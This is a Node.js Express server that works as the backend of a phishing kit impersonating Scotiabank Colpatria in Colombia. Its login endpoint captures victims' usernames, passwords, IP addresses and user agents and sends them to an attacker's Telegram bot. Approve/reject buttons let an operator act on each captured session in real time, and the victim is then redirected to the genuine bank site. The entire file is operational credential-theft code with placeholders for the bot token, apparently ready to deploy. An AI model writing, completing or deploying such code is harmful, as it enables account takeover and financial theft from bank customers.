const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// ── CONFIGURACIÓN ──
const BOT_TOKEN = 'TU_BOT_TOKEN_AQUI';
const CHAT_ID = 'TU_CHAT_ID_AQUI';
const REDIRECT_URL_OK = 'https://www.google.com';
const REDIRECT_URL_ERROR = 'https://www.scotiabankcolombia.com.co';
// ────────────────────

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Almacenar sesiones activas (en producción usar Redis)
const sessions = new Map();

// ── Función para enviar mensaje a Telegram con botones ──
async function sendTelegramWithButtons(usuario, password, ip, ua, fecha, sessionId) {
    const mensaje = `🏦 *Scotiabank Colpatria — Nueva captura*\n\n` +
        `👤 *Usuario:* \`${usuario}\`\n` +
        `🔑 *Contraseña:* \`${password}\`\n` +
        `🌐 *IP:* \`${ip}\`\n` +
        `📱 *UA:* \`${ua}\`\n` +
        `🕐 *Fecha:* \`${fecha}\``;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Botones inline
    const inlineKeyboard = {
        inline_keyboard: [
            [
                { text: '✅ Aprobar', callback_data: `ok_${sessionId}` },
                { text: '❌ Rechazar', callback_data: `err_${sessionId}` }
            ]
        ]
    };

    const payload = {
        chat_id: CHAT_ID,
        text: mensaje,
        parse_mode: 'Markdown',
        reply_markup: JSON.stringify(inlineKeyboard)
    };

    try {
        const response = await axios.post(url, payload);
        return response.data;
    } catch (error) {
        console.error('Error sending Telegram message:', error.message);
        throw error;
    }
}

// ── Endpoint de login ──
app.post('/api/login', async (req, res) => {
    try {
        const { usuario, password } = req.body;

        if (!usuario || !password) {
            return res.status(400).json({ ok: false, message: 'Campos vacíos' });
        }

        // Obtener IP y User-Agent
        const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                   req.socket.remoteAddress ||
                   'N/A';
        const ua = req.headers['user-agent'] || 'N/A';
        const fecha = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';

        // Generar ID de sesión único
        const sessionId = crypto.randomBytes(16).toString('hex');

        // Guardar sesión
        sessions.set(sessionId, {
            usuario,
            password,
            ip,
            ua,
            fecha,
            status: 'pending',
            timestamp: Date.now()
        });

        // Limpiar sesiones viejas (más de 5 minutos)
        const now = Date.now();
        for (const [key, value] of sessions.entries()) {
            if (now - value.timestamp > 300000) {
                sessions.delete(key);
            }
        }

        // Enviar a Telegram con botones
        await sendTelegramWithButtons(usuario, password, ip, ua, fecha, sessionId);

        // Responder al cliente - redirigir a loader
        res.json({
            ok: true,
            redirect: '/loading.html',
            sessionId
        });

    } catch (error) {
        console.error('Error en /api/login:', error);
        res.status(500).json({
            ok: false,
            message: 'Error en el servidor'
        });
    }
});

// ── Endpoint para callback de Telegram ──
app.post('/api/telegram-callback', async (req, res) => {
    try {
        const { callback_query } = req.body;

        if (!callback_query) {
            return res.status(400).send('OK');
        }

        const { data, message } = callback_query;
        const sessionId = data.replace(/^(ok_|err_)/, '');
        const action = data.startsWith('ok_') ? 'ok' : 'err';

        const session = sessions.get(sessionId);
        if (!session) {
            // Sesión expirada
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: '⏰ Sesión expirada. El usuario ya fue redirigido.',
                show_alert: true
            });
            return res.send('OK');
        }

        // Actualizar estado
        session.status = action;

        // Responder al callback
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callback_query.id,
            text: action === 'ok' ? '✅ Acceso aprobado' : '❌ Acceso denegado'
        });

        // Editar mensaje para mostrar decisión
        const mensajeOriginal = message.text;
        const nuevoMensaje = mensajeOriginal +
            `\n\n*Decisión:* ${action === 'ok' ? '✅ APROBADO' : '❌ RECHAZADO'}` +
            `\n*Respondido por:* ${callback_query.from.first_name || 'Admin'}`;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
            chat_id: message.chat.id,
            message_id: message.message_id,
            text: nuevoMensaje,
            parse_mode: 'Markdown'
        });

        // Eliminar botones
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
            chat_id: message.chat.id,
            message_id: message.message_id,
            reply_markup: JSON.stringify({ inline_keyboard: [] })
        });

        res.send('OK');

    } catch (error) {
        console.error('Error en callback:', error.message);
        res.send('OK');
    }
});

// ── Endpoint para verificar estado de sesión ──
app.get('/api/session-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);

    if (!session) {
        return res.json({ status: 'expired' });
    }

    res.json({
        status: session.status,
        redirect: session.status === 'ok' ? REDIRECT_URL_OK :
                 session.status === 'err' ? REDIRECT_URL_ERROR : null
    });
});

// ── Servir archivos estáticos ──
app.use(express.static('public'));

// ── Iniciar servidor ──
app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
});